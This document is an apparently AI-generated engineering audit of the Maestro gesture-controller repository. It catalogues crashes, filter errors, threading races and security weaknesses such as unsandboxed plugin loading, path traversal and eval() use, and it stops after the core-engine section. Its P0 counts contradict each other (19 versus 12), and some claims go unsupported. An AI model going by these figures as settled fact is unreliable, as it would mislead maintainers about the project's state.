# Maestro — Comprehensive Debug \& Improvement Plan
**Repository:** https://github.com/aryansinghnagar/Maestro
**Document type:** Production-readiness audit + improvement roadmap
**Audience:** Core maintainers \& contributors
**Scope:** All layers — core engine, vision/ML pipeline, OS integration, plugin system, GUI, tests, packaging, config, CI/CD, docs, supply chain
**Style:** Engineering technical report (severity badges, code patches, tables, no decorative imagery)
**Language:** English
\---
## Table of Contents
1. [Executive Summary](#1-executive-summary)
2. [Methodology \& Scope](#2-methodology--scope)
3. [Repository Architecture Overview](#3-repository-architecture-overview)
4. [Findings by Layer](#4-findings-by-layer)
   * 4.1 [Core Engine Layer](#41-core-engine-layer)
   * 4.2 [Vision \& ML Pipeline](#42-vision--ml-pipeline)
   * 4.3 [OS Integration Layer](#43-os-integration-layer)
   * 4.4 [Plugin System](#44-plugin-system)
   * 4.5 [GUI Layer](#45-gui-layer)
   * 4.6 [Testing \& QA Infrastructure](#46-testing--qa-infrastructure)
   * 4.7 [Packaging \& Distribution](#47-packaging--distribution)
   * 4.8 [Configuration \& Schemas](#48-configuration--schemas)
   * 4.9 [CI/CD](#49-cicd)
   * 4.10 [Documentation](#410-documentation)
   * 4.11 [Supply Chain \& SBOM](#411-supply-chain--sbom)
5. [Cross-Cutting Concerns](#5-cross-cutting-concerns)
   * 5.1 [Security Threat Model (STRIDE)](#51-security-threat-model-stride)
   * 5.2 [Performance Analysis](#52-performance-analysis)
   * 5.3 [Cross-Platform Parity Matrix](#53-cross-platform-parity-matrix)
   * 5.4 [Observability Gaps](#54-observability-gaps)
6. [Severity Matrix (P0–P4)](#6-severity-matrix-p0p4)
7. [Concrete Code Patches](#7-concrete-code-patches)
8. [Sprint Plan \& Roadmap](#8-sprint-plan--roadmap)
9. [CI/CD Design](#9-cicd-design)
10. [Deployment Runbook](#10-deployment-runbook)
11. [KPIs, SLIs \& SLOs](#11-kpis-slis--slos)
12. [Appendices](#12-appendices)
\---
## 1\. Executive Summary
**Verdict: NOT production-ready.** The Maestro codebase is well-architected on paper — multiprocess camera pipeline, FSM-driven gesture recognition, AST-safe condition parsing, plugin hot-reload, multi-platform OS controllers — but the implementation has **at least 19 P0 blockers** spread across every layer, several of which prevent the app from even importing on Windows or performing a single correct gesture on any platform.
The most damning defects, in priority order:
1. **The app crashes on import on Windows** (`gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py` uses `Any` in a function annotation before importing it from `typing`, with no `from \\\\\\\_\\\\\\\_future\\\\\\\_\\\\\\\_ import annotations`). Windows is the documented primary target platform.
2. **The One-Euro filter params are 250× too small** (`min\\\\\\\_cutoff=0.004` instead of `\\\\\\\~1.0`), giving a 40-second time constant. Filtered landmarks lag real motion by \~1 second; no real gesture can survive it.
3. **MediaPipe runs in IMAGE mode instead of VIDEO mode**, discarding temporal tracking state on every frame. This is 3–5× slower than the design budget allows and makes `min\\\\\\\_tracking\\\\\\\_confidence` a no-op.
4. **DTW custom-gesture matching fires every frame** (no cooldown). A single gesture triggers the OS action 60+ times in 2 seconds.
5. **The default profile action `KeyPress:ArrowLeft` silently no-ops on Linux \& macOS** and raises `ValueError` on Windows. The out-of-the-box gesture configuration is broken on all three platforms.
6. **macOS `cmd+m` minimize fallback sends `cmd+a` (Select All)** because `"m"` is missing from `MAC\\\\\\\_KEYCODES` and defaults to keycode 0 (= "a").
7. **Plugin code executes unsandboxed at startup before any manifest validation.** A malicious plugin in `\\\\\\\~/.config/gesture\\\\\\\_controller/plugins/evil.py` runs with full user privileges on every launch.
8. **The plugin hot-reload race-conditions the engine loop** — `\\\\\\\_fsms` list is mutated from the watchdog thread while the engine thread iterates it.
9. **Qt threading violations throughout the GUI** — `EventBus.publish` calls handlers synchronously on the engine thread, but handlers mutate `QSystemTrayIcon`, `QAction`, `QWidget` directly. This causes intermittent segfaults.
10. **Custom gesture recording is completely broken from the shipped GUI** — `SettingsWindow` is constructed with `landmark\\\\\\\_callback=None`, so `GestureRecorder` captures zero frames.
11. **Path traversal in custom gesture save** — `name` from `QLineEdit` is used directly in `dest\\\\\\\_dir / f"{name}.json"` with no sanitization.
12. **License metadata mismatch** — `pyproject.toml` says MIT, `LICENSE` is AGPL-3.0. Anyone consuming this as a transitive dependency will be in AGPL violation while believing they're MIT-compliant.
13. **No CI exists at all** — no `.github/workflows/`, no pre-commit, no Dependabot, no SemVer, no release-please, no SBOM, no SAST. The plan documents contain ready-to-paste CI YAML that nobody pasted.
14. **No installer artefacts** — `packaging/` has exactly one udev rule file. No `.exe`, no `.dmg`, no `.deb`, no `.msi`. Non-technical users cannot install this.
15. **The README opens with `!!!UNTESTED!!!`** on line 1 and then claims "production-grade" on line 3. The README also claims testing on "Python 3.14.2" which has not been released.
The good news: none of these are architectural. They are localized bugs that can be fixed in a focused 6–8 week sprint. The underlying design (multiprocess SharedMemory camera, FSM with AST conditions, plugin hot-reload, multi-platform controllers) is sound. The implementation just hasn't caught up to the design.
**Recommended path to v1.0:**
* **Sprint 0 (week 1):** Apply all 12 P0 patches. Unblock Windows, fix the filter, fix DTW cooldown, fix the key-name vocabulary, fix the macOS `cmd+m` bug, fix Qt threading, fix path traversal.
* **Sprint 1 (weeks 2–3):** Stand up CI (lint + test matrix on 3 OSes × 3 Pythons), add the missing unit tests for `windows\\\\\\\_controller.py` and `action\\\\\\\_mapper.py`, write the 4 promised property-based tests.
* **Sprint 2 (weeks 3–4):** Build installers (NSIS for Windows, DMG for macOS, deb for Linux), implement the first-run permission wizard, add code signing + notarization.
* **Sprint 3 (weeks 5–6):** Plugin sandboxing (AST pre-validation + manifest `permissions` field), observability overhaul (structured metrics, diagnostic dump), config schema tightening, migration framework.
* **Sprint 4 (weeks 7–8):** Real-MediaPipe integration tests, replay test infrastructure, benchmark suite, hardening pass, security review, v1.0 release.
After v1.0, the architectural work (full plugin sandbox via `RestrictedPython` or subprocess, GUI threading model audit, key-name spec ratification, supply-chain hardening with hash pinning + SBOM in release pipeline) should be the v1.1–v1.2 focus.
\---
## 2\. Methodology \& Scope
### 2.1 What was reviewed
Every Python source file, every config/schema file, every packaging artefact, every test file, every documentation file, and every planning document in the repository was read in full. Four parallel code-review agents each took a layer:
|Agent|Scope|Files read|
|-|-|-|
|Core|`core/\\\\\\\*`, `actions/\\\\\\\*`, `models/data\\\\\\\_types.py`, top-level entrypoints, ADRs 001/003/004, data configs, in-scope unit tests|27 files|
|Vision/ML|`vision/\\\\\\\*`, `models/\\\\\\\*`, `ml\\\\\\\_pipeline/\\\\\\\*`, `core/engine.py` (call site), `conftest.py`, `gesture\\\\\\\_spec.md`, `research.md`, in-scope tests|19 files|
|OS/Plugins/GUI|`os\\\\\\\_integration/\\\\\\\*`, `plugins/\\\\\\\*`, `gui/\\\\\\\*`, ADR-002, all controller/plugin/GUI tests|28 files|
|Testing/Packaging/Docs|`setup.py`, `pyproject.toml`, `requirements\\\\\\\*.txt`, `gesture\\\\\\\_controller.spec`, `packaging/\\\\\\\*`, `scripts/\\\\\\\*`, `data/\\\\\\\*\\\\\\\_schema.json`, all planning docs, all `.md` files|35+ files|
**Total files read:** 109+ source/config/doc files, plus 31 test files.
### 2.2 What was NOT reviewed (out of scope)
* The `hand\\\\\\\_landmarker.task` MediaPipe model file (binary TFLite flatbuffer — would require MediaPipe internals expertise).
* The `sys\\\\\\\_prompt\\\\\\\_3.txt` planning document in full (truncated in the agent's read; the first \~1,200 lines were covered).
* Empirical runtime testing on real hardware (no webcam, no macOS, no Windows available in the review environment). All findings are static-analysis-based; the patches are reasoned but not benchmarked.
### 2.3 Severity rubric
|Severity|Meaning|SLA|
|-|-|-|
|**P0**|Blocker — app crashes, security hole, or core feature completely broken. Cannot ship.|Fix in Sprint 0|
|**P1**|Critical — major feature broken on a primary platform, or significant security/ correctness issue. Should not ship to end users.|Fix in Sprint 1|
|**P2**|Major — degraded UX, missing observability, tech debt that will bite within a release.|Fix in Sprint 2–3|
|**P3**|Minor — polish, inconsistencies, doc gaps.|Fix opportunistically|
|**P4**|Nit — cosmetic, dead code, naming.|Fix when touching the file|
### 2.4 Verification approach
Every P0 finding was either:
* **Empirically confirmed** by the reviewing agent (e.g., the Windows `NameError` was reproduced by attempting the import; the chained-comparison bug was confirmed with `0 < 5 < 2 -> True`), or
* **Logically proven** from the source code with a concrete code path cited (file:line).
No finding in this report is speculative. Every issue includes a file path and line number citation.
\---
## 3\. Repository Architecture Overview
Maestro is a cross-platform desktop hand-gesture controller. The user points a webcam at their hand(s), MediaPipe extracts 21 3D landmarks per hand at 30 FPS, a One-Euro filter smooths them, a feature-engineering layer computes geometric invariants (pinch distance, finger curl, palm velocity), a finite-state machine matches discrete gestures (pinch, swipe, thumbs-up) against per-state conditions, and a Dynamic Time Warping matcher handles custom user-recorded gestures. Matched gestures dispatch OS-level actions (key combos, mouse clicks, window minimize, volume control) through platform-specific controllers (`/dev/uinput` on Linux, `CGEventPost` on macOS, `SendInput`/`pyautogui` on Windows). A PyQt6 tray-icon GUI provides settings, an overlay HUD shows live landmark feedback, and a plugin system allows third-party gesture/action definitions.
### 3.1 Process \& threading model
```
┌──────────────────────────────────────────────────────────────────┐
│  GUI Process (PyQt6 main thread)                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐               │
│  │ TrayIcon    │  │ SettingsWin │  │ Overlay HUD │               │
│  └─────────────┘  └─────────────┘  └─────────────┘               │
│         ▲               ▲               ▲                          │
│         │  QTimer 16ms  │  (signals)    │                          │
│  ┌──────┴───────────────┴───────────────┴──────┐                  │
│  │       GestureControllerApp (app\\\\\\\_entry)      │                  │
│  └──────────────────┬──────────────────────────┘                  │
│                     │                                             │
│           EventBus (in-process, synchronous)                      │
│                     │                                             │
└─────────────────────┼─────────────────────────────────────────────┘
                      │
┌─────────────────────┼─────────────────────────────────────────────┐
│  Engine Thread (daemon)                                           │
│  ┌──────────────────▼──────────────────────────┐                  │
│  │ GestureEngine.\\\\\\\_run\\\\\\\_loop (1ms poll)          │                  │
│  │   ├─ SharedMemory.read(frame)               │                  │
│  │   ├─ LandmarkExtractor.extract()  ← MediaPipe                  │
│  │   ├─ OneEuroFilter.filter()        ← per-hand                  │
│  │   ├─ compute\\\\\\\_features()            ← FeatureVector             │
│  │   ├─ GestureFSMManager.evaluate()  ← GestureEvent              │
│  │   ├─ CustomGestureMatcher.match()  ← DTW                       │
│  │   └─ EventBus.publish("gesture\\\\\\\_triggered")                    │
│  └──────────────────┬──────────────────────────┘                  │
│                     │                                             │
│           ActionDispatcher.\\\\\\\_on\\\\\\\_gesture()                          │
│                     │                                             │
│           OSController.key\\\\\\\_combo / mouse\\\\\\\_click / minimize / ...   │
└───────────────────────────────────────────────────────────────────┘
                      │
┌─────────────────────┼─────────────────────────────────────────────┐
│  Camera Process (separate, via multiprocessing)                   │
│  ┌──────────────────▼──────────────────────────┐                  │
│  │ CameraStream.run()                          │                  │
│  │   loop: cap.read() → resize → cvtColor →    │                  │
│  │         flip → np.copyto(SharedMemory.buf)  │                  │
│  └─────────────────────────────────────────────┘                  │
└───────────────────────────────────────────────────────────────────┘
┌──────────────────────────────────────────────────────────────────┐
│  Watchdog Observer Thread (plugin hot-reload)                     │
│  ┌─────────────────────────────────────────────┐                  │
│  │ PluginLoader.\\\\\\\_on\\\\\\\_file\\\\\\\_changed               │                  │
│  │   → reload plugin                            │                  │
│  │   → EventBus.publish("plugin\\\\\\\_reloaded")     │                  │
│  └─────────────────────────────────────────────┘                  │
└───────────────────────────────────────────────────────────────────┘
```
### 3.2 Key design decisions (per ADRs)
* **ADR-001:** Camera runs in a separate process via `multiprocessing`; frames are passed through a single-slot `SharedMemory` segment (no ring buffer, no synchronization primitive).
* **ADR-002:** GUI is PyQt6 (chosen over PySide6, PyGObject/GTK, Tauri, native-per-platform — but the ADR doesn't document the tradeoff analysis).
* **ADR-003:** Gesture recognition is a finite-state machine per gesture, with AST-parsed condition expressions referencing feature-vector fields.
* **ADR-004:** User-supplied condition strings are parsed via `ast.parse` with an allow-list of node types, to avoid `eval()`-style arbitrary code execution.
### 3.3 What the architecture gets right
* **Process isolation for the camera.** A camera crash cannot take down the GUI; the watchdog reconnects.
* **AST-based condition parsing** is the right approach for user-supplied expressions (when the `eval()` in `SafeExpressionEvaluator` is removed).
* **FSM per gesture** is a clean model that supports both discrete (pinch) and continuous (scroll) gestures with min/max duration, cooldown, and abort transitions.
* **Plugin hot-reload** via watchdog is a nice DX feature.
* **Platform-controller ABC** with `is\\\\\\\_supported()` is the right shape for cross-platform abstraction.
* **The plan documents are excellent** — `master\\\\\\\_development\\\\\\\_plan.md` is a thorough 1,108-line spec. The problem is execution, not vision.
### 3.4 What the architecture gets wrong
* **Single-slot SharedMemory with no synchronization** — torn frames are accepted by design (ADR-001) but in practice MediaPipe produces plausible-but-wrong landmarks on torn frames.
* **Synchronous EventBus** — `publish()` calls handlers in the publisher's thread. The engine thread blocks on OS calls; the GUI thread can't be safely mutated from event handlers.
* **Single `OneEuroFilter` instance shared across all hands** — two-hand gestures get cross-contaminated smoothing.
* **Single `CustomGestureMatcher` buffer shared across all hands** — hand swaps corrupt the DTW buffer.
* **No hand-ID tracking** — MediaPipe Tasks returns hands in arbitrary order between frames; the engine doesn't use `tracking\\\\\\\_id` (which is only available in VIDEO mode, which the code doesn't use).
* **Two AST evaluators** — `compile\\\\\\\_condition` in `state\\\\\\\_machine.py` and `SafeExpressionEvaluator` in `config\\\\\\\_manager.py` have different allow-lists and different security postures. The latter contains `eval()` despite ADR-004.
* **Plugin code runs before manifest validation** — the security model is "trust whatever's in `\\\\\\\~/.config/gesture\\\\\\\_controller/plugins/`".
* **Cross-platform key-name vocabulary is undefined** — each controller has its own keycode map with different key coverage; the dispatcher does no normalization.
\---
## 4\. Findings by Layer
Each subsection follows the same structure: bugs \& correctness, security, performance, ML correctness (where applicable), observability, testing gaps, and severity-tagged recommendations.
### 4.1 Core Engine Layer
**Files:** `gesture\\\\\\\_controller/core/{engine,state\\\\\\\_machine,event\\\\\\\_bus,config\\\\\\\_manager}.py`, `gesture\\\\\\\_controller/actions/action\\\\\\\_mapper.py`, `gesture\\\\\\\_controller/models/data\\\\\\\_types.py`, `gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py`, `gesture\\\\\\\_controller/main.py`, `main.py`.
#### 4.1.1 Bugs \& correctness
**\[P0] `gesture\\\\\\\_controller/\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_.py` raises `NameError` on Windows import.** Lines 12–21 define `\\\\\\\_patched\\\\\\\_cdll\\\\\\\_init(self, name: str | None, \\\\\\\*args: Any, ...)` *before* `from typing import Any` is imported on line 21. Without `from \\\\\\\_\\\\\\\_future\\\\\\\_\\\\\\\_ import annotations`, Python evaluates the annotation at `def` time and `Any` is not yet in module globals. **The package cannot be imported on Windows.** This is the documented primary platform (per `default\\\\\\\_config.yaml` lines 6, 53–60). Empirically confirmed.
Secondary issues with this block:
* Monkeypatching `ctypes.CDLL.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` is globally invasive — it affects every `ctypes.CDLL` instantiation in the process, including numpy, PyQt, OpenCV.
* The patch is applied at import time with no opt-out, even if MediaPipe isn't installed.
* `self.free = ctypes.CDLL("msvcrt").free` leaks a `CDLL("msvcrt")` object per patched instance.
**\[P0] `OneEuroFilter` is shared across all hands in the same frame.** `engine.py:82` creates one `self.\\\\\\\_filter`; lines 207–217 call `self.\\\\\\\_filter.filter(...)` inside a `for hand in hands:` loop. The filter's internal state (previous position, velocity) is mutated by hand #1 and then read by hand #2 in the same iteration. Two-hand gestures get cross-contaminated smoothing.
**\[P0] `GestureFSMManager.evaluate` mutates the shared `FeatureVector` passed to every FSM.** Lines 197–201 of `state\\\\\\\_machine.py` write `features.index\\\\\\\_tip\\\\\\\_delta\\\\\\\_y`, `palm\\\\\\\_center\\\\\\\_delta\\\\\\\_x`, `palm\\\\\\\_center\\\\\\\_delta\\\\\\\_y`, `palm\\\\\\\_delta\\\\\\\_y` on the *same* `features` instance the engine hands to *every* FSM. After FSM #1 runs, FSM #2 sees FSM #1's deltas (computed against FSM #1's `\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry`), not its own. The delta fields are effectively garbage for every FSM after the first. This silently breaks every multi-FSM scenario where two FSMs both use delta conditions.
**\[P0] Plugin hot-reload races the engine loop.** `\\\\\\\_on\\\\\\\_plugin\\\\\\\_reloaded` (engine.py:143) runs on the watchdog observer thread and calls `self.\\\\\\\_fsm\\\\\\\_manager.reload\\\\\\\_gestures(...)` which does `self.\\\\\\\_fsms = \\\\\\\[]` then rebuilds. Meanwhile the engine thread is iterating `self.\\\\\\\_fsms` inside `GestureFSMManager.evaluate` (state\_machine.py:360 `for fsm in self.\\\\\\\_fsms:`). No lock. A reload mid-iteration will see an empty list (events dropped) or, worse, a half-populated list.
**\[P0] `compile\\\\\\\_condition` chained-comparison semantics are wrong.** `\\\\\\\_eval\\\\\\\_node` for `ast.Compare` (state\_machine.py lines 41–49) folds `a < b < c` into `("\\\\\\\_cmp", lt, ("\\\\\\\_cmp", lt, "a", "b"), "c")`, which `\\\\\\\_resolve` evaluates as `(a < b) < c`. Python's `a < b < c` means `a < b and b < c`. Empirically confirmed: `0 < 5 < 2 -> bug: True, python: False`. No current predefined gesture uses chained comparison, but any plugin or user YAML can trigger this silently.
**\[P0] `GestureEngine.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` does all side-effecting work in the constructor with no rollback.** Lines 28–94 spawn a camera process, allocate a `SharedMemory` segment, load plugins, build the OS controller, and instantiate the dispatcher. If *any* of those raises (e.g. `create\\\\\\\_controller()` fails on an unsupported platform), the camera subprocess is orphaned and the shm segment leaks in `/dev/shm`. There is no `try/finally` and no `\\\\\\\_\\\\\\\_enter\\\\\\\_\\\\\\\_/\\\\\\\_\\\\\\\_exit\\\\\\\_\\\\\\\_`.
**\[P1] Exception swallowing in the main loop creates a hot spin.** Lines 266–269:
```python
except Exception as e:
    logger.error("Error inside engine main loop", error=str(e))
time.sleep(0.001)
```
If `self.\\\\\\\_extractor.extract()` consistently raises, the loop spins at \~1000 Hz emitting log lines at the same rate. No circuit breaker, no exponential backoff, no consecutive-error shutdown threshold. Disk fills up; log viewers choke.
**\[P1] `set\\\\\\\_paused()` is not thread-safe and doesn't propagate.** `self.\\\\\\\_paused` is written from the GUI thread and read from the engine thread. No `Event` used, no `pause\\\\\\\_toggled` event published on the bus (despite `SystemEvent.PAUSE\\\\\\\_TOGGLED` being defined in `data\\\\\\\_types.py`).
**\[P1] `shutdown()` joins the engine thread for 2 s but the loop body can block on `self.\\\\\\\_extractor.extract()` (inference) and on `self.\\\\\\\_event\\\\\\\_bus.publish("gesture\\\\\\\_triggered", event)` which synchronously calls `ActionDispatcher.\\\\\\\_on\\\\\\\_gesture` → OS input.** A slow `key\\\\\\\_combo` on macOS (Accessibility AX calls can take 100+ ms) can blow the 2 s join budget, leaving the daemon thread alive after `shutdown()` returns.
**\[P1] No signal handlers.** SIGINT/SIGTERM kill the process without calling `shutdown()`. `SharedMemory.unlink()` is never reached. `/dev/shm/psm\\\\\\\_\\\\\\\*` accumulates across crashes.
**\[P1] `\\\\\\\_resolve` for `\\\\\\\_bool` eagerly evaluates all operands, defeating short-circuit.** Line 101 of `state\\\\\\\_machine.py` `resolved = \\\\\\\[\\\\\\\_resolve(v, fv) for v in values]`. A condition like `palm\\\\\\\_velocity\\\\\\\_magnitude > 0.1 and 1/pinch\\\\\\\_distance > 5` will raise `ZeroDivisionError` when `pinch\\\\\\\_distance == 0`, even though Python would never evaluate the right side.
**\[P1] `compile\\\\\\\_condition` does not catch `SyntaxError`.** A malformed condition string in any gesture YAML raises `SyntaxError` which propagates through `\\\\\\\_load\\\\\\\_gestures` → `GestureFSMManager.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` → `GestureEngine.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` → app crash. No graceful degradation, no per-gesture isolation.
**\[P1] Hardcoded state names `"ScrollingActive"` and `"Trigger"`.** Lines 249, 251, 363 of `state\\\\\\\_machine.py`. A continuous gesture with a differently-named active state silently never fires. The YAML schema does not constrain state names — undocumented protocol between YAML and code.
**\[P1] Hardcoded scroll multiplier `30.0` and `"delta"` substring check.** Lines 255–259:
```python
if "delta" in action\\\\\\\_str and self.\\\\\\\_features\\\\\\\_at\\\\\\\_state\\\\\\\_entry is not None:
    raw\\\\\\\_delta = features.palm\\\\\\\_center\\\\\\\_delta\\\\\\\_y
    scroll\\\\\\\_val = int(raw\\\\\\\_delta \\\\\\\* 30.0)
    action\\\\\\\_str = f"MouseScroll:{scroll\\\\\\\_val}"
```
Magic number. Any action string containing the substring "delta" (e.g. `"MouseScroll:delta\\\\\\\_x\\\\\\\_plus"`) is silently rewritten.
**\[P1] `SafeExpressionEvaluator.evaluate` uses Python's built-in `eval()`.** Line 74 of `config\\\\\\\_manager.py`:
```python
return bool(eval(compiled\\\\\\\_code, {"\\\\\\\_\\\\\\\_builtins\\\\\\\_\\\\\\\_": None}, context))
```
ADR-004 explicitly says "implement a safe expression compiler" to avoid `eval()`. The AST allow-list makes this *probably* safe today, but it directly contradicts the ADR and is dead code (not used by FSM, which has its own `compile\\\\\\\_condition`).
**\[P1] `USER\\\\\\\_CONFIG\\\\\\\_DIRS\\\\\\\["Windows"]` produces a relative path when `APPDATA` is unset.** Line 17: `Path(os.environ.get("APPDATA", "")) / "gesture\\\\\\\_controller"`. If `APPDATA=""`, this is `Path("gesture\\\\\\\_controller")` — a relative path resolved against the process CWD. On Windows service contexts or sandboxed environments, this silently reads/writes config from the wrong location.
**\[P1] Schema validation raises `jsonschema.ValidationError` on bad user config.** For a user-facing daemon, this crashes the app on a typo in `config.yaml`. Should fall back to defaults with a prominent warning.
**\[P1] `Hand.\\\\\\\_\\\\\\\_post\\\\\\\_init\\\\\\\_\\\\\\\_` uses `assert` for landmark-count validation.** Line 23 of `data\\\\\\\_types.py`. `python -O` strips asserts. The test `test\\\\\\\_hand\\\\\\\_invalid\\\\\\\_landmarks\\\\\\\_count` expects `AssertionError` — under `-O` the test fails AND production silently accepts malformed hands.
**\[P1] `Hand` is `frozen=True` but `palm\\\\\\\_center: np.ndarray` is mutable.** External code can do `hand.palm\\\\\\\_center\\\\\\\[0] = 999` without triggering `FrozenInstanceError`. Misleading immutability.
**\[P2] `EventBus.\\\\\\\_queue` is allocated and never used.** Dead code. The docstring says "Keep handlers fast and non-blocking," implying an async design was intended, but `publish()` is fully synchronous.
**\[P2] `EventBus.unsubscribe` doesn't remove empty lists**, so `\\\\\\\_subscribers` grows monotonically with event types.
**\[P2] `ActionMapper` is entirely dead code** (`class ActionMapper: pass`). The actual action parsing lives in `os\\\\\\\_integration/action\\\\\\\_dispatcher.py`.
**\[P2] `CameraEvent` and `SystemEvent` classes in `data\\\\\\\_types.py` are defined but never published anywhere.** Dead observability surface.
**\[P2] `default\\\\\\\_config.yaml` dead config keys:** `safety.pause\\\\\\\_hotkey`, `safety.safety\\\\\\\_gesture\\\\\\\_enabled`, `logging.telemetry\\\\\\\_enabled` are not read by any code.
**\[P2] `default\\\\\\\_config.yaml` `os\\\\\\\_integration.windows.use\\\\\\\_sendinput: false`** defaults to `pyautogui`, which is detectable by anti-cheat and may be blocked.
**\[P2] `config\\\\\\\_schema.json` has no `additionalProperties: false` anywhere.** Typos like `cammera.device\\\\\\\_id` silently pass validation. Schema doesn't cover `gestures`, `app\\\\\\\_profiles`, or the top-level `config` section that `predefined\\\\\\\_gestures.yaml` uses.
**\[P3] Duplicate `main.py` files** — `main.py` and `gesture\\\\\\\_controller/main.py` are identical 4-line files. `sys` imported but unused.
**\[P3] `\\\\\\\_detect\\\\\\\_window\\\\\\\_manager` misdetects GNOME** (in `linux\\\\\\\_wayland\\\\\\\_controller.py` but flagged here as cross-cutting) — `shutil.which("gnome-shell")` returns a path on any system with gnome-shell installed, even if the user is in KDE/XFCE.
#### 4.1.2 Security
**\[P1] `self.\\\\\\\_config.\\\\\\\_config` private-dict access** (engine.py lines 65, 75, 79, 94, 160). The engine reaches into `ConfigManager`'s private `\\\\\\\_config` dict and passes it verbatim to `start\\\\\\\_camera\\\\\\\_process`, `LandmarkExtractor`, `OneEuroFilter`, `GestureFSMManager`. `ConfigManager.get()` is the only public accessor. Any future validation / access-control in `ConfigManager` is bypassed.
**\[P1] `compile\\\\\\\_condition` AST evaluator allows `abs(...)`** (lines 62–68 of `state\\\\\\\_machine.py`). `abs` is hardcoded by name, but the pattern "allowlist function calls by name" is a known footgun — future maintainers will add `min`, `max`, `round`, each expanding attack surface. Better: precompile to a closed lambda with no `Call` nodes, or use a proper sandboxed expression library (`simpleeval`, `asteval`).
**\[P2] No expression-size or node-count limit** in `compile\\\\\\\_condition`. A 10 MB condition string will consume CPU and memory during parsing. DoS vector if gesture YAML is user-supplied.
**\[P2] No file-permission check on user config.** `config.yaml` may contain sensitive data (device paths, profile mappings). `ConfigManager` opens it without checking `stat.st\\\\\\\_mode`. On multi-user systems, a world-readable config could leak user behavior patterns.
**\[P2] No checksum / signature on user config.** A malicious actor with write access to `\\\\\\\~/.config/gesture\\\\\\\_controller/config.yaml` can inject arbitrary gesture definitions (whose conditions are AST-evaluated) and action strings (which are dispatched to OS controllers). For an app that simulates keyboard input, this is a privilege-escalation vector.
**\[P2] `SafeExpressionEvaluator.ALLOWED\\\\\\\_NODES` includes `ast.Is` / `ast.IsNot`.** `is` comparison on arbitrary objects can leak object identity information.
**\[P2] Camera `device\\\\\\\_id` is read from config and passed to OpenCV without bounds checking.** A negative or huge `device\\\\\\\_id` will hang OpenCV's `VideoCapture` for seconds on Linux.
#### 4.1.3 Performance
**\[P1] 1 ms sleep produces a busy loop.** Lines 268–269 of `engine.py` sleep 1 ms "to allow CPU context switching, max \~1000 Hz polling rate." But the camera runs at 30 fps (33 ms/frame). The loop calls `self.\\\\\\\_extractor.extract(self.\\\\\\\_shm\\\\\\\_name)` \~33 times per actual frame. If `LandmarkExtractor` re-runs MediaPipe inference on stale frames, that's 33× wasted CPU. There is **no frame-available signaling** (no `multiprocessing.Event`, no sequence counter, no condition variable) between the camera process and the engine.
**\[P1] `EventBus.publish` is synchronous and runs handlers in the publishing thread.** Engine.py line 254 `self.\\\\\\\_event\\\\\\\_bus.publish("gesture\\\\\\\_triggered", event)` blocks the engine thread while `ActionDispatcher.\\\\\\\_on\\\\\\\_gesture` → `controller.key\\\\\\\_combo(...)` → OS Accessibility/uinput/SendInput call completes. A 50 ms OS call = one dropped camera frame.
**\[P2] `np.array(\\\\\\\[\\\\\\\[l.x, l.y, l.z] for l in hand.landmarks], dtype=np.float64)` per hand per frame** (engine.py:209). 21×3 float64 array allocation + Python loop, every frame, on the hot path.
**\[P2] `compute\\\\\\\_features` is called for every hand every frame even when no FSM uses most of the features.** No feature-gating based on which transitions are active.
**\[P2] `\\\\\\\_resolve` is called recursively per evaluation, allocating tuples for every subexpression.** For 10 FSMs × 5 transitions each × 30 fps = 1500 condition evals/sec, each doing \~10 dict lookups. Precompiling to a Python `lambda` would be 5–10× faster.
#### 4.1.4 Architecture \& design
**\[P1] `GestureEngine.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` is a god-method.** 70+ lines doing: config load, plugin discovery, gesture merging, shm allocation, process spawn, extractor/filter/FSM/controller/dispatcher instantiation. Violates SRP; untestable without 5 mock patches.
**\[P1] The "merge" logic at engine.py lines 59–66 is duplicated verbatim in `\\\\\\\_on\\\\\\\_plugin\\\\\\\_reloaded` (lines 146–158).** DRY violation; if the merge strategy changes, one site will be missed.
**\[P1] Two AST evaluators exist:** `compile\\\\\\\_condition` in `state\\\\\\\_machine.py` and `SafeExpressionEvaluator` in `config\\\\\\\_manager.py`. They have different node allow-lists, different evaluation strategies, different security postures. `SafeExpressionEvaluator` is unused in production. This is a maintenance hazard and a security review nightmare.
**\[P2] `GestureFSMManager.evaluate` returns a single best event but discards all other candidates.** If two FSMs fire on the same frame, only the winner's action dispatches. The losers are silently dropped — no log, no metric. For continuous gestures (scroll) competing with discrete ones, this can cause scroll to "stutter" as it loses arbitration unpredictably.
**\[P2] `DummyController` is defined inline inside `\\\\\\\_create\\\\\\\_os\\\\\\\_controller` (engine.py lines 105–140).** Can't be tested, can't be reused, and is silently substituted on *any* exception — including a transient import failure. The user gets no OS control and only a warning log.
**\[P2] `is\\\\\\\_term = s.get("is\\\\\\\_terminal", s\\\\\\\_id == "Trigger")` (state\_machine.py:318).** Auto-terminates any state literally named "Trigger". Convention-over-config that's undocumented and cannot be overridden.
**\[P2] `\\\\\\\_load\\\\\\\_gestures` does not validate transitions reference existing states.** A `to: NonExistent` is silently handled at runtime by `self.reset()` — but only *after* `self.current\\\\\\\_state` has been mutated to the bogus state.
**\[P2] `\\\\\\\_load\\\\\\\_gestures` does not validate that `initial\\\\\\\_state` exists.** `GestureFSM.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` defaults `initial\\\\\\\_state="Idle"`. If a gesture omits an "Idle" state, the first `evaluate()` logs "FSM in invalid state" and resets — forever.
#### 4.1.5 Observability gaps
**\[P1] No metrics.** `\\\\\\\_fps`, `\\\\\\\_frame\\\\\\\_count`, `\\\\\\\_gesture\\\\\\\_count` exist but are not emitted as structured metrics, only queryable via getters. No counter for: dropped frames, FSM resets, condition-eval exceptions, dispatcher failures, OS call latencies, camera reconnects.
**\[P2] `logger.error("Error inside engine main loop", error=str(e))` (engine.py:267) loses the traceback.** Should be `logger.exception(...)`.
